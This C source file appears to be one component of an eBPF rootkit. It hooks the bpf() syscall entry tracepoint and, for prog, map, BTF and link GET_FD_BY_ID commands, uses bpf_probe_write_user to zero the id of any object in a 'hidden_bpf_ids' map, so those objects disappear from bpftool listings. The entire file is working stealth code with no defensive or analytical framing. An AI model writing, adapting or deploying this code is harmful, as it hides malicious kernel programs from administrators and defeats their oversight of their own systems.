// bpf_filter.c — hide our own BPF objects from bpftool / libbpf enumeration
//
// Hook : tracepoint/syscalls/sys_enter_bpf   (BPF_PROG_TYPE_TRACEPOINT)
// Maps : hidden_bpf_ids  (shared, declared in common.h — no extra maps)
//
// Unlike sys_exit_*, the sys_enter_* tracepoint DOES record the syscall
// arguments (verified on the live kernel:
//   field:int cmd;                 offset:16;
//   field:union bpf_attr * uattr;  offset:24;
//   field:unsigned int size;       offset:32;
// ) so args->args[0..2] are directly usable here.
//
// ---------------------------------------------------------------------------
// COMMAND NUMBERS — the values in the original spec were wrong
// ---------------------------------------------------------------------------
// The spec listed {15, 18, 31, 34}.  Those are NOT the *_GET_FD_BY_ID
// commands on this kernel.  Verified by compiling against the kernel's own
// <linux/bpf.h>:
//
//     BPF_PROG_GET_FD_BY_ID  = 13   (spec said 31)
//     BPF_MAP_GET_FD_BY_ID   = 14   (spec said 15)
//     BPF_BTF_GET_FD_BY_ID   = 19   (spec said 18)
//     BPF_LINK_GET_FD_BY_ID  = 30   (spec said 34)
//
// (31 is BPF_LINK_GET_NEXT_ID, 15 is BPF_OBJ_GET_INFO_BY_FD, 18 is
//  BPF_BTF_LOAD, 34 is BPF_LINK_DETACH — none of which take an object id at
//  attr offset 0, which is why the spec's set would have been both ineffective
//  and liable to corrupt an unrelated command's attribute.)
//
// For all four real commands the object id lives at offset 0 of union bpf_attr,
// so zeroing that u32 makes the syscall fail with -ENOENT and the object
// disappears from `bpftool prog list` / `map list` enumeration.
// ---------------------------------------------------------------------------

#undef __VMLINUX_H__   /* see hide.c: neutralise the pipeline's -D__VMLINUX_H__ */

#include "common.h"

#define AX_BPF_PROG_GET_FD_BY_ID 13
#define AX_BPF_MAP_GET_FD_BY_ID  14
#define AX_BPF_BTF_GET_FD_BY_ID  19
#define AX_BPF_LINK_GET_FD_BY_ID 30

SEC("tracepoint/syscalls/sys_enter_bpf")
int ax_bpf_filter(struct trace_event_raw_sys_enter *args)
{
    unsigned long cmd = args->args[0];
    void *uattr;
    __u32 id = 0;
    __u32 zero = 0;

    if (cmd != AX_BPF_PROG_GET_FD_BY_ID && cmd != AX_BPF_MAP_GET_FD_BY_ID &&
        cmd != AX_BPF_BTF_GET_FD_BY_ID && cmd != AX_BPF_LINK_GET_FD_BY_ID)
        return 0;

    uattr = (void *)args->args[1];
    if (!uattr)
        return 0;

    /* id is the first u32 of union bpf_attr for all four commands */
    if (bpf_probe_read_user(&id, sizeof(id), uattr) != 0)
        return 0;

    if (bpf_map_lookup_elem(&hidden_bpf_ids, &id) == NULL)
        return 0;

    /* Rewrite the id to 0 so the lookup misses with -ENOENT.  This is a user
     * address (the syscall's own argument), so bpf_probe_write_user is the
     * right primitive here — kernel memory is NOT writable from BPF.  If the
     * write fails we simply let the call through: failing loudly here would
     * be worse than a momentarily visible object. */
    bpf_probe_write_user(uattr, &zero, sizeof(zero));

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
